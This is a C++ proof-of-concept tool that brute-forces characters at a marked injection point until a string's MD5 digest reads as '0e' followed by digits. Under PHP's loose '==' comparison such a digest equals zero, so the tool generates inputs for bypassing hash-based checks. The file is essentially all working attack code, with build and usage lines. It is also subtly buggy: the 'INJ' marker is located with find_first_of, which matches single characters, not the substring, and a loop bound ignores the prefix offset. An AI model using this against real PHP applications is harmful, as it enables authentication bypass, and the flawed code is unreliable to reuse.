/*
 * MD5 collision modulo PHP equivalence comparison generation PoC
 * Compilation: clang++ -O3 -std=c++11 -pthread md5.cpp md5col.cpp -o md5col
 * Usage: ./md5col <prefix>INJ<postfix> <len> <threads>
 */

#include <chrono>
#include <cmath>
#include <iomanip>
#include <iostream>
#include "md5.h"
#include <string>
#include <thread>
#include <vector>

#define FROM_CHAR 32
#define TO_CHAR 128

int THREADS_NUM = 4;
int LEN_BRUTE = 4;

bool checkit(std::string test) {
    int i = 0;
    if(test[0] != 48) {
        return false;
    }
    while(test[++i] == 48) {}
    if(test[i] != 101 || i == test.length() - 1) {
        return false;
    }
    while(++i < test.length()) {
        if(test[i] > 57 || test[i] < 48) {
            return false;
        }
    }
    return true;
}

void doit(int from, std::string pre_mask, std::string post_mask) {
    std::cout << "Started thread from: " << from << std::endl;
    std::string test(LEN_BRUTE, FROM_CHAR);
    test = pre_mask + test + post_mask;
    int offset = pre_mask.length();
    test[offset] = (unsigned char) from;
    while(test[offset] <= from + (TO_CHAR - FROM_CHAR) / THREADS_NUM) {
        if(checkit(md5(test))) {
            std::string res = "";
            for(int j = offset; j < offset + LEN_BRUTE; ++j) {
                res += std::to_string(test[j]) + " ";
            }
            std::cout << "FOUND " << res << std::endl;
            exit(0);
        }
        for(int j = offset + LEN_BRUTE - 1; j >= offset; --j) {
            if(test[j] == 127) {
                if(j == 0) {
                    std::cout << "Finished thread from: " << from << std::endl;
                    return;
                }
                test[j] = FROM_CHAR;
            }
            else {
                test[j] += 1;
                break;
            }
        }
    }
    std::cout << "Finished thread from: " << from << std::endl;
}

int main(int argc, char *argv[]) {
    if(argc < 2) {
        std::cout << "Usage: ./hashcol prefixINJpostfix <len> <threads>" << std::endl;
        return 0;
    }
    if(argc > 2) {
        LEN_BRUTE = std::stoi(argv[2]);
    }
    if(argc > 3) {
        THREADS_NUM = std::stoi(argv[3]);
    }

    std::string mask = argv[1];
    std::string pre_mask, post_mask;
    size_t split_pos = mask.find_first_of("INJ");
    if(split_pos == std::string::npos) {
        std::cout << "No injection point found" << std::endl;
        return 0;
    }
    pre_mask = mask.substr(0, split_pos);
    post_mask = mask.substr(split_pos + 3);

    std::vector<std::thread> threads;
    for(int i = 0; i < THREADS_NUM; ++i) {
        threads.push_back(std::thread(doit, FROM_CHAR + i * (TO_CHAR - FROM_CHAR) / THREADS_NUM, pre_mask, post_mask));
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    for(auto &t: threads) {
        t.join();
    }

    return 0;
}
